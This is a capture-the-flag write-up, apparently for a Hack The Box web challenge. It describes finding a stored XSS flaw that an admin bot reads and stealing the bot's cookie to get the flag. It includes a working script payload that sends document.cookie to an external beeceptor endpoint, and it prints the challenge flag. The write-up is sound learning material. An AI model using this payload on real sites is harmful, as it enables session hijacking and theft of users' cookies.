# Toy Workshop (Day 1)

For this challenge, we are provided with source code for a web application as well as a docker file to test the web application locally.

I proceed to build the docker image and navigating to the website, where I was greeted with the following page:

![webpage](https://user-images.githubusercontent.com/71312079/151320134-1d568e80-3ef7-4a3d-9836-913ae953398e.png)

Clicking on one of the elves produces a prompt that **"The manager is busy right now"** and a textbox for input. Immediately I think of the possibility of XSS and send the following input:

![testxss](https://user-images.githubusercontent.com/71312079/151320121-3120681a-b100-4e97-a271-f5fed899fba3.png)

I see that my message was successfully delivered then refreshed the page. However I did not receive the alert, leading me to think that perhaps XSS isn't the way to go...

Next, I viewed the source code, zooming in to the *routes.js* file which shows the routes of the app. I see that sending the message in the text box will invoke a function *readQueries* performed by a bot:

![submit](https://user-images.githubusercontent.com/71312079/151320106-7ff80377-1d5e-40a9-a809-ab9a82178d0a.png)

I then navigate to the *readQueries* function located in */challenge/bot.js*, where I see the admin visiting */queries* to read the queries. Interestingly, I see that the flag is actually the cookie name, thus it appears that the cookie needs to be stolen in order to obtain the flag.

![botjs_readqueries](https://user-images.githubusercontent.com/71312079/151321533-a30fc3c9-8418-48c7-acba-5f7439ac2aba.png)

Navigating back to *routes.js* to see the GET request for */queries*, I see that only the localhost on 127.0.0.1 can access the cookie,. 

![get](https://user-images.githubusercontent.com/71312079/151320096-43c4d547-3f1d-47b7-a1fa-84c9be1f451b.png)

In order to obtain the cookie, we need to perform the following:

* Set up a publicly accessible website 
  
  * I created an endpoint called **test234** on **beeceptor**

* Craft a script to send the cookie to my endpoint
  
  ```html
  <script> document.write('<img src="https://test234.free.beeceptor.com/collect.gif?cookie=' + document.cookie + '" />') </script>
  ```

* Paste the script in the text box and submit it

After performing the steps above, I waited around a minute for the admin to view the queries. Voila! The cookie was sent to my endpoint and I obtained the flag:

![beeceptor](https://user-images.githubusercontent.com/71312079/151480111-781487a7-df2f-4796-b9b9-9acf398710c4.png)

Flag: `HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`